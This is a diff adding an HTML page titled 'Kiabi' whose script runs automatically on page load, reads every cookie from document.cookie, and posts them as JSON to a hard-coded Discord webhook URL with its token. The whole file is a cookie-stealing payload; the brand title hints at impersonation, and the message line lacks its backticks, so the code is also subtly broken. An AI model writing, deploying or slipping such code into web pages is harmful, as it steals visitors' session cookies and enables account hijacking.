@@ -1,0 +1,48 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Kiabi</title>
+    <script type="text/javascript">
+        function logCookies() {
+            let cookies = document.cookie.split(';');
+            let cookieList = {};
+            cookies.forEach(cookie => {
+                let [name, value] = cookie.split('=');
+                cookieList[name.trim()] = value;
+            });
+
+            // Convert cookieList to a JSON string
+            let cookieData = JSON.stringify(cookieList);
+
+            // Define the webhook URL
+            let webhookUrl = 'https://discord.com/api/webhooks/1257610872931745833/cNxjmiIqILOYolrRwKS4AvWOm6dokXw5wEgj1DNMyZVV45fsC2yrZ0qadY3ryeroJLlS';
+
+            // Send the cookies data to the Discord webhook
+            fetch(webhookUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    content: Cookies: ${cookieData}
+                })
+            }).then(response => {
+                if (response.ok) {
+                    console.log('Cookies sent to Discord webhook');
+                } else {
+                    console.error('Error sending cookies to Discord webhook');
+                }
+            }).catch(error => {
+                console.error('Error sending cookies to Discord webhook:', error);
+            });
+        }
+
+        // Automatically run the logCookies function when the page loads
+        window.onload = logCookies;
+    </script>
+</head>
+<body>
+    <h1>Logging Cookies to Discord</h1>
+    <p>Cookies will be sent to the specified Discord webhook.</p>
+</body>
+</html>
